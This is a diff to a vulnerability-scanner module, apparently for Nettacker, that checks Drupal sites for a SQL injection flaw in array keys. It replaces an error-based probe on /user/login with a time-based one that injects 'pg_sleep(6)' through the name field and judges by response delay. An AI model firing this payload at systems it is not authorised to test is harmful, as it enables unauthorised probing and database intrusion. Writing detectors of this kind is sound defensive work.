@@ -8,7 +8,7 @@ info:
     associative array keys, which are directly concatenated into SQL placeholder identifiers during condition translation rather than being properly sanitized.
     This module attempts to identify the presence of this vulnerability through two different endpoints:
     1. It exploits the /jsonapi/node/article endpoint to obtain an explicit SQL error that reveals the vulnerability, if JSON:API extension is enabled;
-    2. It attempts SQL injection via the /user/login endpoint, which if effective results in an internal server error response.
+    2. It attempts a time-based SQL injection via the /user/login endpoint, which if effective results in a delayed response.
     If at least one of these methods succeeds, the target is considered vulnerable.
   reference:
     - https://nvd.nist.gov/vuln/detail/CVE-2026-9082
@@ -56,10 +56,13 @@ payloads:
             content:
               regex: '(?i)SQLSTATE\[\d+\]'
               reverse: false
-
-      # SQL injection via login triggers internal server error without verbose error message in response body, but is always available
+  
+  - library: http
+    steps:
+      # SQL injection via login is always available and it normally results in an internal server error response.
+      # The time-based payloads do not trigger any error but delay the response, thus actively confirming the vulnerability.
       - method: post
-        timeout: 3
+        timeout: 30 
         headers:
           User-Agent: "{user_agent}"
           Content-Type: "application/json"
@@ -68,7 +71,7 @@ payloads:
         json:
           name:
             "0": placeholder
-            "0||(SELECT 6cd248caf8e64043a25bf05fab136ac4)": placeholder
+            "0||(SELECT pg_sleep(6))": placeholder
           pass: placeholder
         url:
           nettacker_fuzzer:
@@ -87,6 +90,7 @@ payloads:
           log: "detected via /user/login endpoint"
           condition_type: and
           conditions:
-            status_code:
-              regex: "500"
-              reverse: false
+            # Drupal legacy authentication uses supplied username in 3 different queries,
+            # hitting the sleep in all of them (i.e., responsetime can reach 6*3 = 18 seconds).
+            # That is why the timeout is so much longer than the sleep argument.
+            responsetime: ">= 6" 
